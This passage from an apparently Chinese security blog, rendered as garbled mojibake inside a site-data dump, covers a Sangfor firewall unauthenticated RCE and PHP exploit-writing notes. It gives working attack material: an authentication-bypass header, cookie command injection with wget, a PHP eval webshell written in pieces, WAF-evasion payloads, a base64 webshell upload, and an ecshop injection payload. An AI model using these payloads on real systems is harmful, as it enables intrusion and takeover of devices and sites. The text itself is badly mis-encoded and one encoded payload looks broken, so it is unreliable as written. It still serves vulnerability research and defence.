127.0.0.1ã€‚è¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶äº†ã€‚ æ–‡ä»¶è¯»å–åˆ†æ loadfile.phpæŸ¥çœ‹ /svpn_html/loadfile.php åˆ†ææ–‡ä»¶è¯»å–çš„è¿‡ç¨‹ã€‚ 123$file = addslashes($_GET[&#x27;file&#x27;]); ï¼šä» GET è¯·æ±‚ä¸­è·å–åä¸º `file` çš„å‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè½¬ä¹‰ã€‚echo $file; ï¼š å°†æ–‡ä»¶åè¾“å‡ºåˆ°é¡µé¢ã€‚readfile($file); ï¼š å°†æ–‡ä»¶å†…å®¹è¾“å‡ºåˆ°å“åº”ä½“ï¼Œå®ç°æ–‡ä»¶çš„ä¸‹è½½ã€‚ ä¹‹å‰æŸ¥çœ‹ apache é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº† sangfor ä¸‹ä¸€ä»£é˜²ç«å¢™çš„çœŸå®è·¯å¾„å’Œè®¿é—®è·¯å¾„ã€‚é€šè¿‡åˆ†æ loadfile.phpï¼Œæˆ‘ä»¬å¾—åˆ°äº†æ–‡ä»¶è¯»å–çš„è®¿é—®å‚æ•°ã€‚æœ€åå†æ·»åŠ ä¸Šèº«ä»½éªŒè¯ç»•è¿‡çš„è¯·æ±‚å¤´ã€‚æœ€ç»ˆå®ç°äº†æ–‡ä»¶è¯»å–çš„æ•ˆæœã€‚ è·å– PHPSESSIDå¯ä»¥è·å–åˆ°ä¸€äº›å®æ—¶æ˜¾ç¤ºçš„æ–‡ä»¶ï¼ŒåŠ«æŒä¼šè¯ PHPSESSID 12345/etc/sinfor/DcUserCookie.conf/etc/en/sinfor/DcUserCookie.conf/config/etc/sinfor/DcUserCookie.conf/config/etc/en/sinfor/DcUserCookie.conf/virus/apache/apache/logs/access_log å‘½ä»¤æ‰§è¡Œå¯»æ‰¾å‘½ä»¤æ‰§è¡Œæ³¨å…¥ç‚¹å°† pspy äºŒè¿›åˆ¶æ–‡ä»¶ä¸ grep å‘½ä»¤ä¸€èµ·æ”¾åœ¨ç›®æ ‡æ¡†ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹ Apache è¿›ç¨‹ç”Ÿæˆçš„å†…å®¹ï¼š åœ¨è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå‘ç°ç”¨æˆ·åè¢«ç›´æ¥ä¼ é€’åˆ° shell å‘½ä»¤ä¸­ã€‚ é€šè¿‡æµè§ˆ CFWLogInOutDAO.php ï¼Œå‘ç°äº†æ¼æ´ç‚¹çš„å­˜åœ¨ã€‚ä»£ç ä¸­ä½¿ç”¨äº† addslashes() æ¥è½¬ä¹‰ï¼Œä½†åœ¨ä½¿ç”¨ popen() å‡½æ•°æ—¶å´æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å¤„ç†ã€‚ 1234567891011121314151617public function remoteLogin(&amp;$in_arrSearchCondition) &#123; $userName = $in_arrSearchCondition [&#x27;user_name&#x27;]; $passwd = $in_arrSearchCondition [&#x27;password&#x27;]; //rsaçš„è§£å¯† $t_strMD5 = $this-&gt;decrypt($passwd); $fp = popen(&quot;/usr/sbin/remoteLogin remoteLogin $userName $t_strMD5&quot;, &quot;r&quot;); $retResult = fread($fp, 20); pclose($fp); if ($retResult == &quot;retLoginSuccess&quot;) &#123; $in_arrSearchCondition [&#x27;user_name&#x27;] = $userName.&quot;_remote_&quot;; $t_strUserName = addslashes($in_arrSearchCondition [&#x27;user_name&#x27;]); $t_strSQL = &quot;SELECT * FROM FW_AUTH_dcuser.UserAuthInfo WHERE user_name = &#x27;$t_strUserName&#x27; AND status = 1 LIMIT 1&quot;; return $this-&gt;setSession($t_strSQL); &#125; return false; &#125; æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°äº†å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œä½†å› ä¸ºå–å€¼è‡ª cookieï¼Œå› æ­¤æ— æ³•ç”¨æ³¨å…¥åˆ†å·æ¥æˆªæ–­å‘½ä»¤ï¼Œä¹Ÿæ— æ³•è¿›è¡ŒURL ç¼–ç ã€‚ä½†å¯ä»¥ä½¿ç”¨åå¼•å·æ¥è¾¾æˆå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ 1234567POST /cgi-bin/login.cgi HTTP/1.1Host: Cookie: PHPSESSID=`$(wget host)`;Content-Type: Application/X-www-FormConnection: close &#123;&quot;opr&quot;:&quot;login&quot;, &quot;data&quot;:&#123;&quot;user&quot;: &quot;watchTowr&quot; , &quot;pwd&quot;: &quot;watchTowr&quot; , &quot;vericode&quot;: &quot;EINW&quot; , &quot;privacy_enable&quot;: &quot;0&quot;&#125;&#125; æ·±å…¥åˆ©ç”¨ RCEä¸Šä¸€ç« èŠ‚ä»‹ç»åˆ°çš„æ–¹å¼ï¼Œå‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œä¸”é€šè¿‡ wget ä¸‹è½½æ–‡ä»¶çš„æ–¹å¼ï¼Œé™åˆ¶å¾ˆå¤šã€‚äºæ˜¯æœ¬ç« å°†è¯¦ç»†ä»‹ç»å¦‚ä½•å·§å¦™åˆ©ç”¨æ¼æ´ç‚¹ï¼Œåœ¨å‘½ä»¤æ‰§è¡Œå—é™ä¸”ä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œå®ç°æˆåŠŸæ‰§è¡Œå¤æ‚ä»£ç çš„æ•ˆæœã€‚ å†™å…¥ä¸€å¥è¯æœ¨é©¬å¯ä»¥è®¿é—®åˆ°çš„webè·¯å¾„ï¼š 1/fwlib/sys/virus/webui/svpn_html payload ä¼ å…¥å‘½ä»¤éƒ¨åˆ†é‡åˆ°çš„é™åˆ¶ç”±äºæ‰§è¡Œå‘½ä»¤çš„è·¯å¾„ï¼Œæ˜¯åœ¨PHPSESSIDï¼Œå–å€¼è‡ªcookieã€‚æ‰€ä»¥é¢ä¸´ä¸€äº›é™åˆ¶ã€‚ æ— æ³•æ³¨å…¥åˆ†å·æˆªæ–­å‘½ä»¤ æ— æ³•ä½¿ç”¨ || &amp;&amp; ç­‰ç‰¹æ®Šç¬¦å· æƒ³è¦é€šè¿‡echoå†™å…¥æ–‡ä»¶æ—¶ï¼Œ&gt;&gt; è¿½åŠ å†™å…¥çš„æ–¹å¼ï¼Œä¸å¯ä»¥ï¼Œ&gt; ä¼šè¢«æˆªæ–­ è¾ƒé•¿çš„ PHP ä»£ç éƒ¨åˆ†ï¼Œéƒ½æ— æ³•è¢«ä¼ å…¥ï¼Œæ— æ³•æ­£å¸¸è§£æï¼Œéœ€è¦åˆ†æ®µæˆªå–å†™å…¥ ä¼ å…¥å‘½ä»¤æ—¶ï¼Œéœ€è¦å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ url ç¼–ç  ç”±äºæ— æ³•ç”¨è¿½åŠ çš„æ–¹å¼å†™å…¥åˆ°ä¸€ä¸ª php æ–‡ä»¶å†…ï¼Œæ‰€ä»¥å°† php çš„ä»£ç æˆªæ–­ï¼Œåˆ†åˆ«å†™å…¥åˆ°ä¸åŒçš„ txt å†…ï¼Œæœ€åå†å°†è¿™äº›æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼Œå†™åˆ° php æ–‡ä»¶å†…ã€‚å…ˆå†™å…¥ä¸€ä¸ªå°é©¬ï¼Œä¹‹ååœ¨è¿™ä¸ªå°é©¬çš„åŸºç¡€ä¸Šï¼Œå®ç°æ›´å¤æ‚çš„åŠŸèƒ½ã€‚ 123&lt;?php eval($_POST[&quot;pass&quot;])?&gt; 1234567891011echo -e -n \\&quot;&lt;?php\\\\n\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/1.txtecho -e -n \\&quot;eval\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/2.txtecho -e -n &#x27;($_POST[\\&quot;pass&#x27; &gt; /fwlib/sys/virus/webui/svpn_html/3.txtecho -e -n &#x27;\\&quot;])&#x27; &gt; /fwlib/sys/virus/webui/svpn_html/4.txtecho -e -n \\&quot;\\\\n?&gt;\\\\n\\&quot; &gt; /fwlib/sys/virus/webui/svpn_html/5.txtcat /fwlib/sys/virus/webui/svpn_html/1.txt /fwlib/sys/virus/webui/svpn_html/2.txt /fwlib/sys/virus/webui/svpn_html/3.txt /fwlib/sys/virus/webui/svpn_html/4.txt /fwlib/sys/virus/webui/svpn_html/5.txt&gt; /fwlib/sys/virus/webui/svpn_html/xxx.php é€šè¿‡è¿™ç§æ–¹å¼å†™å…¥çš„æ—¶å€™ï¼Œä¹Ÿé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œè™½ç„¶å•ç‹¬å†™å…¥ txt æ–‡ä»¶æ—¶ï¼Œtxt çš„æ–‡ä»¶åå¯ä»¥éšæ„é€‰å–ã€‚ä½†æ˜¯è‹¥é€šè¿‡ cat&gt;php çš„æ–¹å¼å†™å…¥ã€‚éœ€è¦ txt æ–‡ä»¶åï¼Œåªæœ‰ 1 ä½ï¼Œå†™å…¥çš„ php æ–‡ä»¶åï¼Œ3 ä½ä»¥ä¸‹ã€‚ æ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶è·å¾—å›æ˜¾ã€‚ 1echo system(&quot;id&quot;) ä½†æ˜¯ï¼Œä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œï¼Œä¼šæœ‰å¾ˆå¤šçš„é™åˆ¶ï¼Œå½“æ‰§è¡Œç±»ä¼¼echo &quot;hello&quot; &gt; 1.php è¿™æ ·çš„é•¿å‘½ä»¤æ—¶ï¼Œä¼šå¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤æ‹¦æˆªã€‚æ‰€ä»¥åªèƒ½é€šè¿‡è¿™ç§æ–¹å¼æ‰§è¡ŒçŸ­å‘½ä»¤ã€‚ é˜²æŠ¤ç»•è¿‡ä¸Šä¸€å°èŠ‚æåˆ°çš„ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ php ä»£ç è¿›è¡Œç¼–ç ã€‚ä½†æ˜¯ç¼–ç çš„æ—¶å€™ï¼Œä¼šé‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œå½“æ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„ php å‡½æ•°ï¼Œä»¥åŠå¤–éƒ¨è¿æ¥çš„æµé‡æœ‰æ¶æ„ç‰¹å¾æ—¶ï¼Œåˆ™ä¼šè¢«å®‰å…¨é˜²æŠ¤è®¾å¤‡æ£€æµ‹åˆ°å¹¶æ‹¦æˆªã€‚å› æ­¤ï¼Œæœ¬å°èŠ‚å°†è¯¦ç»†ä»‹ç»å¦‚ä½•ç»•è¿‡å®‰å…¨é˜²æŠ¤æªæ–½ï¼Œå¹¶æˆåŠŸæ‰§è¡Œå¤æ‚çš„ PHP ä»£ç ã€‚ base64 ç¼–ç å½“å‘½ä»¤æ˜æ–‡ä¼ è¾“æ—¶ï¼Œä¼šè¢«é™åˆ¶ï¼Œæ‰€ä»¥æƒ³åˆ°å¯ä»¥å¯¹è¾“å…¥çš„å‘½ä»¤è¿›è¡Œ base64 ç¼–ç æ¥ç®€å•ç»•è¿‡ã€‚ä½†æ˜¯ç›´æ¥ç”¨ php ä»£ç çš„ base64 å‡½æ•°ï¼Œä¼šè¢«é˜²å¾¡æœºåˆ¶æ‹¦æˆªï¼Œæ— æ³•é¡ºåˆ©å‘åŒ…ã€‚ æ‰€ä»¥æƒ³åˆ°ç”¨å¦å¤–çš„å†™æ³•ï¼Œç»•è¿‡é˜²å¾¡æœºåˆ¶ 1echo system($_POST[1](&quot;cHdk&quot;));&amp;1=base64_decode php ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°çš„å‘ å½“ base64 ä¸­å­˜åœ¨ + å·ï¼Œå‘åŒ…åä¼šå­˜åœ¨è§£ææœ‰è¯¯çš„é—®é¢˜ï¼Œæ‰€ä»¥å¯¹ base64 æ•´ä½“è¿™ä¸€éƒ¨åˆ†ï¼Œè¿˜éœ€è¦å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œé¢å¤–çš„ url ç¼–ç  1url.QueryEscape(base64Encode(cmd)) å½“å‘é€çš„å‘½ä»¤å¤ªçŸ­ï¼ˆå°äºä¸‰ä½ï¼‰ï¼Œå¯¼è‡´ base64 é•¿åº¦å¾ˆçŸ­æ—¶ï¼Œä¹Ÿä¼šé¢ä¸´å¤±è´¥çš„é—®é¢˜ã€‚è¿™æ—¶å¯ä»¥åˆ©ç”¨å‘½ä»¤çš„æ›¿æ¢æ¥ç»•è¿‡ã€‚ 12ls echo ls | sh WAF è®¾ç½®äº†ä¸€äº›ç­–ç•¥ï¼Œå¯¹= æœ‰é™åˆ¶ï¼Œæ¯”å¦‚ base64 ä¹‹åï¼Œç»“å°¾å¤„æœ‰ç­‰å·ï¼Œä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªï¼Œå°±ä¼šå¯¼è‡´å‘åŒ…å¤±è´¥ï¼Œä½†æ˜¯å¯ä»¥åœ¨ç­‰å·çš„åé¢æ·»åŠ ç©ºæ ¼ï¼Œè¿›è¡Œç»•è¿‡ã€‚base64 åæ·»åŠ ç©ºæ ¼å¹¶ä¸ä¼šå½±å“ç»“æœã€‚ï¼ˆå¯èƒ½ waf ä¸ºäº†é˜²æ­¢èµ‹å€¼è®¾ç½®çš„è§„åˆ™ï¼Œèµ‹å€¼å­—ç¬¦ä¸²å°±ä¼šç”¨åˆ° $a=&quot;b&quot; ï¼‰ é€šè¿‡åˆ©ç”¨ http å¤´æ¥è¿›è¡Œä¼ å‚ã€‚é™åˆ¶æ˜¯å¯¹é•¿åº¦æœ‰é™åˆ¶ï¼Œhttp å¤´é•¿åº¦è¶…è¿‡ 3000 æ—¶ä¼šå¤±è´¥ 1echo system($_POST[1]($_SERVER[&quot;HTTP_CMD&quot;]));&amp;1=base64_decode $_SERVER[&quot;HTTP_CMD&quot;] æ˜¯è·å– http è¯·æ±‚å¤´çš„æ•°æ®ã€‚ åµŒå¥—å¤šå±‚ $_POST æ—¢ç„¶ç›´æ¥ä¼ å…¥æœ‰é™åˆ¶ï¼Œé‚£å°±é€šè¿‡æ”¹å˜å†™æ³•çš„æ–¹å¼ç»•è¿‡ï¼Œè‡ªè¡Œä¼ å‚è¿›å»ã€‚ 1echo system($_POST[1]($_POST[2]));&amp;1=base64_decode&amp;2=bHMgLw== åˆ©ç”¨ hex2bin å’Œ base64 ä¸€ä¸ªæ€è·¯ï¼Œå°±æ˜¯é€šè¿‡ç¼–ç æ¥ç»•è¿‡å®ƒçš„é˜²æŠ¤æœºåˆ¶ã€‚å®ƒæœ‰ä¸€å®šçš„ç‰ˆæœ¬é™åˆ¶ã€‚ï¼ˆsangfor çš„è¿™ä¸ªäº§å“ä¸æ”¯æŒï¼Œå®ƒçš„ç‰ˆæœ¬åœ¨5.3.2ï¼‰ 12echo system(hex2bin($_POST[&quot;command&quot;])); // æ™®é€šå†™æ³•echo system($_POST[1](&quot;command&quot;));&amp;1=hex2bin // ç»•è¿‡å†™æ³• ç»•è¿‡æ¶æ„æµé‡çš„æ£€æµ‹å½“èƒ½æ‰§è¡Œ php ä»£ç çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæƒ³åˆ°ç”¨ webshell ç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸¤ä¸ªé—®é¢˜ã€‚ webshell ç®¡ç†å·¥å…·çš„é©¬æ˜¯å¯ä»¥æ­£å¸¸å†™å…¥å¹¶ä¸”åœ¨ç½‘ç«™å†…é€šè¿‡ get çš„æ–¹å¼èƒ½æ­£å¸¸è®¿é—®ï¼Œä½†æ˜¯åœ¨ webshell ç®¡ç†å·¥å…·è¿æ¥çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºé”™ã€‚æ‰€ä»¥å°±æƒ³åˆ°äº†ï¼Œå¯èƒ½æ˜¯è¢«é˜²æŠ¤è®¾å¤‡æ‹¦æˆªäº†ã€‚äºæ˜¯å°±éœ€è¦æ”¹å˜é©¬çš„ç‰¹å¾ï¼Œç»•è¿‡é˜²æŠ¤è®¾å¤‡ã€‚ åœ¨æ­¤æ¬¡æ”»å‡»çš„ç»•è¿‡ï¼Œéœ€è¦ä¿®æ”¹ webshell æœ¨é©¬çš„é»˜è®¤è¿æ¥å¯†ç ã€å¯†é’¥ keyã€é»˜è®¤è¯·æ±‚å¤´ å…³äºwebshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾ï¼Œå¯ä»¥å‚è€ƒä»¥å‰çš„æ–‡ç« ï¼š å“¥æ–¯æ‹‰v4.0æµé‡è§£å¯†åŠç‰¹å¾æµé‡æå– - Gryffinbit å†°è4.0ç‰¹å¾åˆ†æåŠæµé‡æ£€æµ‹æ€è·¯ - Gryffinbit è¿æ¥çš„è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Š webshell å·¥å…·ä¹Ÿè¦å‘åŒ…è¿‡å»ï¼Œæ‰€ä»¥ï¼Œæ ¹æ®æ­¤æ¬¡æ¼æ´çš„æ¼æ´ç‚¹ï¼Œè¿˜éœ€è¦ä¿®æ”¹ç®¡ç†å·¥å…·çš„è¯·æ±‚å¤´ï¼Œè¦åŠ ä¸Šä¸€è¡Œ 1Y-Forwarded-For: 127.0.0.1 å¦å¤–ï¼Œåœ¨ä¼  webshell é©¬ä¸Šå»çš„æ—¶å€™ï¼Œå› ä¸ºè¦é¢å¤–æ§åˆ¶æ›´å¤šçš„å‚æ•°ã€ä¼ å…¥çš„å†…å®¹ï¼Œä¼ å…¥çš„åç§°ã€‚æ‰€ä»¥éœ€è¦æ›´å¤šçš„å˜é‡ã€‚åœ¨è¿™é‡Œä¹Ÿå‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„å‘ç‚¹ï¼š æ‰§è¡Œçš„å‡½æ•°æ›´å¤æ‚ï¼Œæ‰€ä»¥éœ€è¦æ›´å¤šçš„ä¼ å‚ç‚¹ 1234file_put_contents($_POST[filename],base64_decode($_POST[content])); // æ­£å‘å†™æ³•pass= $_POST[1]($_POST[2],$_POST[3]($_POST[4]));&amp;1=file_put_contents&amp;2=filename.php&amp;3=base64_decode&amp;4=PD9waHAKQHNlc3Npb25fc3RhcnQoKTsKQHNldF90aW1lX2xpbWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBlbmNvZGUoJEQsJEspewogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7CiAgICAgICAgJGMgPSAkS1skaSsxJjE1XTsKICAgICAgICAkRFskaV0gPSGF5bG9hZCk7CiAgICAgICAgZWNoAgIGVjaG8gc3Vic3RyKG1kNSgkcGFzcy4ka2V5KSwxNik7CiAgICB9ZWxzZXsKICAgICAgICBpZiAoc3RycG9zKCRkYXRhLCJnZXRCYXNpY3NJbmZvIikhPT1mYWxzZSl7CiAgICAgICAgICAgICRfU0VTU0lPTlskcGF5bG9hZE5hbWVdPWVuY29kZSgkZGF0YSwka2V5KTsKICAgICAgICB9CiAgICB9Cn0K// ç»•è¿‡å†™æ³• å¿…é¡»è¦åœ¨æœ¨é©¬ä¼ å‚ç‚¹ pass= çš„åé¢åŠ ä¸€ä¸ªç©ºæ ¼è¿›è¡Œä¼ å‚ã€‚ æ€»ç»“é€šè¿‡æ·±å…¥ç ”ç©¶æ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™çš„æ¼æ´ï¼Œæˆ‘ä»¬æ‘¸æ¸…äº†è¯¥äº§å“æ›´å¤šçš„ç»†èŠ‚ï¼Œç ”ç©¶å‡ºäº†åˆ©ç”¨èŒƒå›´æ›´å¹¿çš„æ”»å‡»æ–¹å¼ã€‚ å¸Œæœ›åœ¨é˜…è¯»æœ¬ç¯‡æ–‡ç« åï¼Œèƒ½ä¸ºå¤§å®¶å¸¦æ¥ä¸€äº›æ–°æ€è·¯çš„å¯å‘ã€‚ å‚è€ƒå‘½ä»¤æ‰§è¡Œç»•è¿‡WAFæ€»ç»“ï¼ŒRCEå¸¸è§çš„Bypassæ€è·¯ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· Yet More Unauth Remote Command Execution Vulns in Firewalls - Sangfor Edition â€” é˜²ç«å¢™ä¸­è¿˜æœ‰æ›´å¤šéèº«ä»½éªŒè¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ - Sangfor ç‰ˆ (watchtowr.com)","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"æ·±ä¿¡æœ","slug":"æ·±ä¿¡æœ","permalink":"https://gryffinbit.top/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"}],"author":"Gryffinbit"},{"title":"å†™PHPç«™çš„expæ—¶é‡åˆ°çš„é—®é¢˜æ€»ç»“","slug":"å†™PHPç«™çš„expæ—¶é‡åˆ°çš„é—®é¢˜æ€»ç»“","date":"2023-10-20T11:43:41.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/å†™PHPç«™çš„expæ—¶é‡åˆ°çš„é—®é¢˜æ€»ç»“/","permalink":"https://gryffinbit.top/2023/10/20/%E5%86%99PHP%E7%AB%99%E7%9A%84exp%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"","text":"å°é©¬ä¼ å¤§é©¬çš„æ€æƒ³ é¸¿å®‡å¤šç”¨æˆ·å•†åŸ user.php ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ é€šè¿‡å‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œä¼ å…¥ PHPä»£ç ã€‚ å†™å…¥ PHP ä»£ç åˆ°æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å…ˆå†™æˆ txt çš„æ–‡ä»¶æ ¼å¼ï¼ŒæŸ¥çœ‹å†™å…¥çš„å†…å®¹æ˜¯å¦è¢«æ‹¦æˆªï¼Œæ˜¯å¦è¢«è§£æäº†ã€‚ å½“å‰çš„çŠ¶æ€æ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†ï¼Œç›´æ¥echo çš„æ–¹å¼ï¼Œè¿›è¡Œphp é©¬çš„å†™å…¥ï¼Œå¯èƒ½ä¼šå¤±è´¥ã€‚è¿™æ—¶å€™ï¼Œå¯ä»¥å…ˆå†™å…¥txtçœ‹çœ‹ï¼Œå†™å…¥çš„phpå‡½æ•°æ˜¯å¦è¢«è§£æäº†ã€‚ æˆ‘ä»Šå¤©é‡åˆ°çš„æ˜¯ï¼Œä¼ å…¥çš„éƒ¨åˆ†ï¼Œè¢«&quot; è§£æäº†ï¼Œpoc çš„éƒ¨åˆ†æ˜¯è¿™æ ·çš„ï¼Œæ˜¯åˆ©ç”¨äº† user.php çš„å‚æ•°è¿›è¡Œä¼ å…¥ã€‚ç„¶åé€ æˆäº†å‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯user.phpï¼Œä¼šå¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œè§£æã€‚æ‰€ä»¥ï¼Œç›´æ¥åœ¨è¿™é‡Œä¼ é©¬çš„è¯ï¼Œä¼šè¢«è§£æå¤„ç†æ‰ã€‚å¹¶ä¸”ï¼Œå¦‚æœå‡½æ•°é‡Œçš„å‚æ•°æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œæ¯”å¦‚ï¼Œ$_POST[â€œstringâ€]ï¼Œå®ƒå°±ä¼šè¢«è§£ææ‰ï¼Œä¸èƒ½é¡ºåˆ©å†™å…¥ã€‚æ‰€ä»¥ç”¨æ•°å­—. æ‰€ä»¥å°±æƒ³åˆ°äº†ï¼Œæ—¢ç„¶èƒ½å‘½ä»¤æ‰§è¡Œï¼Œé‚£å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå†™ä¸€ä¸ªphpçš„æ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡è¿™ä¸ªæ–‡ä»¶ï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚å…ˆå†™ä¸€ä¸ªå°é©¬ï¼Œé€šè¿‡å°é©¬ä¼ å¤§é©¬ã€‚å†™å°é©¬çš„æ—¶å€™ï¼Œè¦ç”¨ç»•è¿‡çš„æ–¹å¼æ¥å†™ã€‚ä¸è¦æ­£å‘çš„å»å†™ã€‚ 1`echo &quot;&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt;)&quot; &gt; hello.php`&#125;;&amp;1=$_POST[1]&amp;2=$_POST[2] POST é‡Œé¢çš„å‚æ•°ï¼Œç”¨çš„æ˜¯æ•°å­—ï¼Œæ˜¯ä¸ºäº†é¿å…å†™è¿›å»çš„æ—¶å€™è¢«è§£ææ‰ã€‚file_put_contents çš„æ–¹å¼ï¼Œå°†å†…å®¹å†™å…¥ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æ¥æ”¶ä¼ å…¥çš„æ–‡ä»¶åçš„ï¼Œç¬¬äºŒä¸ªæ¥æ”¶ä¼ å…¥çš„PHPä»£ç ã€‚ æˆåŠŸä¸Šé©¬ windowsç¯å¢ƒï¼Œcmd ä¸å¥½ç”¨çš„æ—¶å€™ï¼ŒæŠŠ powershell æå‡ºæ¥æ™®é€šå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™æ˜¯è¿™æ · 1action=login&amp;pp123=$&#123;`cmd`&#125;; ç‰›é€¼å¹¶ä¸”æœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œæ˜¯è¿™æ · 1action=login&amp;pp123=$&#123;@var_dump(print%20`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe%20cmd`)&#125;; å¦‚æœèƒ½æ‰§è¡Œphpï¼Œä¼˜å…ˆphpå†…ç½®æ‰§è¡Œå‘½ä»¤ã€‚ 1echo(system(&quot;dir&quot;)); PHP ååºåˆ—åŒ–æ¼æ´1554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&quot; è§£ç å 1554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,-1&#x27; UNION/*,2,4,5,6,7,8,&#123;$asd&#x27;];eval (base64_decode (&#x27;eval(base64_decode($_POST[rick]));&#x27;));//&#125;xxx,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&quot; å…¶ä¸­ï¼Œå‰åçš„éƒ¨åˆ†æ˜¯md5ï¼Œè§£å¯†ä¹‹åæ˜¯ecshop 1ecshopads|a:2:&#123;s:3:\\&quot;num\\&quot;;s:233:\\&quot;*/SELECT 1,-1&#x27; UNION/*,2,4,5,6,7,8,&#123;$asd&#x27;];eval (base64_decode (&#x27;eval(base64_decode($_POST[rick]));&#x27;));//&#125;xxx,10-- -\\&quot;;s:2:\\&quot;id\\&quot;;s:11:\\&quot;-1&#x27; UNION/*\\&quot;;&#125;ecshop&quot; æ‰€ä»¥æ¼æ´ä¼ å‚ç‚¹ï¼Œåœ¨rické‚£é‡Œï¼Œpostä¼ å…¥ã€‚ evalå‡½æ•°æ¥å¯ä»¥ä¼ å‚æ¥è¿›è¡Œphpçš„ä»£ç æ‰§è¡Œã€‚ åˆ©ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œçš„ç‚¹ï¼Œæ¥æ‰§è¡Œå‘½ä»¤ ä¼ å…¥å‚æ•°ï¼Œæ‰§è¡Œcmdå‘½ä»¤ 1echo(system(\\&quot;&quot;+cmd+&quot;\\&quot;)); è¿›è¡Œé©¬çš„ä¸Šä¼  å¯ä»¥åˆ©ç”¨phpçš„file_put å‡½æ•°æ¥è¿›è¡Œæ–‡ä»¶çš„å†™å…¥ã€‚ 1&quot;action=login&amp;rick=&quot; + base64EncodeWaTqS(&quot;file_put_contents(&#x27;&quot;+filename+&quot;&#x27;,&#x27; &quot;+content+&quot;&#x27;);&quot;) content çš„å†…å®¹æ˜¯phpé©¬çš„å†…å®¹ï¼Œfilenameæ˜¯é©¬çš„æ–‡ä»¶åã€‚ é™„å½•phpä¸­ï¼ŒåŒå¼•å·é‡Œé¢æ˜¯å¯ä»¥è§£æå˜é‡çš„ï¼Œä½†æ˜¯å•å¼•å·é‡Œé¢ä¸è§£æå˜é‡ã€‚ 